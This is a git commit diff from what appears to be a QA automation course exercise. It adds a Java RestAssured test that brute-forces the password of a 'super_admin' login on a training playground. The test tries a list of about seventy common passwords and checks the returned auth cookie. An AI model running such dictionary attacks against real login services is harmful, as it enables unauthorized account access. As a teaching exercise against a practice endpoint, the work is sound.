242de0c2dc292328b1c629d4d6d1f8fe7bf6b524
Горелик  Андрей <Andrey.Gorelik@fors.ru>
2023-03-03 23:34:10 +0300

    Ex9: Подбор пароля

--- src/test/java/HelloFromAndrey.java
+++ src/test/java/HelloFromAndrey.java
@@ -1,8 +1,10 @@
+import com.fasterxml.jackson.annotation.JsonIgnoreType;
 import io.restassured.RestAssured;
 import io.restassured.path.json.JsonPath;
 import io.restassured.response.Response;
 import org.junit.jupiter.api.Test;
-import java.util.Objects;
+
+import java.util.*;
 
 public class HelloFromAndrey {
 
@@ -91,5 +93,44 @@ public class HelloFromAndrey {
         String resultJob = checkResultWithTimeout.get("result");
         assert Objects.equals(statusWithTimeout, "Job is ready");
         assert !Objects.equals(resultJob, "");
+    }
+
+    @Test
+    public void testPostBruteForcePassword() {
+        List<String> passwords = Arrays.asList("password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football", "1234567",
+                "monkey", "111111", "letmein", "1234", "1234567890", "dragon", "baseball", "sunshine", "iloveyou", "trustno1", "princess", "1dragon",
+                "adobe123[a]", "123123", "welcome", "login", "admin", "qwerty123", "solo", "1q2w3e4r", "master", "666666", "photoshop[a]", "1qaz2wsx",
+                "qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321", "bailey", "access", "flower", "555555", "passw0rd", "shadow", "lovely",
+                "7777777", "michael", "!@#$%^&*", "jesus", "password1", "superman", "hello", "charlie", "888888", "696969", "hottie", "freedom", "aa123456",
+                "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald", "batman", "zaq1zaq1", "Football", "000000", "123qwe");
+
+        for (String password : passwords) {
+
+            Response checkPassword = RestAssured
+                    .given()
+                    .queryParam("login", "super_admin")
+                    .queryParam("password", password)
+                    .when()
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+
+            String cookie = checkPassword.getCookie("auth_cookie");
+
+            Map<String, String> mapCookies = new HashMap<>();
+            mapCookies.put("auth_cookie", cookie);
+
+            Response checkCookieAut = RestAssured
+                    .given()
+                    .cookies(mapCookies)
+                    .when()
+                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                    .andReturn();
+
+           String serverResponse = checkCookieAut.asString();
+           if (Objects.equals(serverResponse, "You are authorized")){
+               System.out.println(password);
+               System.out.println(serverResponse);
+           }
+        }
     }
 }
